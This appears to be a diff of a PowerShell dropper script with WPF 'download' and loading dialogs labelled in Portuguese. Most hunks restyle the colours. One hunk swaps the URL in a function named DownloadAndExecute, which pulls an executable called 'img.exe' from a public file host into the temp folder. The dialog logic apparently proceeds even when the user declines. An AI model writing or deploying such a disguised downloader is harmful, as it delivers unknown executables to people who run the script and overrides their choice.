@@ -15,11 +15,11 @@ function Show-DownloadDialog {
     $window.Opacity = 0.98
 
     $border = New-Object System.Windows.Controls.Border
-    $border.Background = [System.Windows.Media.Brushes]::DarkSlateGray
+    $border.Background = [System.Windows.Media.Brushes]::Black
     $border.CornerRadius = "15"
     $border.Padding = "20"
     $border.Margin = "20"
-    $border.BorderBrush = [System.Windows.Media.Brushes]::Teal
+    $border.BorderBrush = [System.Windows.Media.Brushes]::DarkRed
     $border.BorderThickness = "3"
 
     $stackPanel = New-Object System.Windows.Controls.StackPanel
@@ -46,7 +46,7 @@ function Show-DownloadDialog {
     $yesButton.Content = "Sim"
     $yesButton.Width = 100
     $yesButton.Margin = "10"
-    $yesButton.Background = [System.Windows.Media.Brushes]::MediumSeaGreen
+    $yesButton.Background = [System.Windows.Media.Brushes]::Crimson
     $yesButton.Foreground = [System.Windows.Media.Brushes]::White
     $yesButton.FontSize = 16
     $yesButton.FontFamily = New-Object System.Windows.Media.FontFamily "Segoe UI"
@@ -57,7 +57,7 @@ function Show-DownloadDialog {
     $noButton.Content = "Não"
     $noButton.Width = 100
     $noButton.Margin = "10"
-    $noButton.Background = [System.Windows.Media.Brushes]::Firebrick
+    $noButton.Background = [System.Windows.Media.Brushes]::Crimson
     $noButton.Foreground = [System.Windows.Media.Brushes]::White
     $noButton.FontSize = 16
     $noButton.FontFamily = New-Object System.Windows.Media.FontFamily "Segoe UI"
@@ -94,7 +94,7 @@ function Show-DownloadDialog {
 }
 
 function DownloadAndExecute {
-    $url = "https://www.upload.ee/download/16677072/66c7c0e1fc261eda8ea7/img.exe"
+    $url = "https://www.upload.ee/download/16677072/6b6fc11eadc91eda9381/img.exe"
     $output = "$env:TEMP\img.exe"
     
     $webClient = New-Object System.Net.WebClient
@@ -129,11 +129,11 @@ if ($null -eq $dialogResult -or $dialogResult -eq $false) {
     $loadingWindow.Opacity = 0.98
     
     $border = New-Object System.Windows.Controls.Border
-    $border.Background = [System.Windows.Media.Brushes]::DarkSlateGray
+    $border.Background = [System.Windows.Media.Brushes]::Black
     $border.CornerRadius = "15"
     $border.Padding = "20"
     $border.Margin = "10"
-    $border.BorderBrush = [System.Windows.Media.Brushes]::Teal
+    $border.BorderBrush = [System.Windows.Media.Brushes]::DarkRed
     $border.BorderThickness = "3"
 
     $loadingStackPanel = New-Object System.Windows.Controls.StackPanel
@@ -154,7 +154,7 @@ if ($null -eq $dialogResult -or $dialogResult -eq $false) {
     $progressBar.Width = 300
     $progressBar.Height = 20
     $progressBar.IsIndeterminate = $true
-    $progressBar.Foreground = [System.Windows.Media.Brushes]::Teal
+    $progressBar.Foreground = [System.Windows.Media.Brushes]::DarkRed
     $progressBar.Margin = "10"
 
     $loadingStackPanel.Children.Add($loadingText)
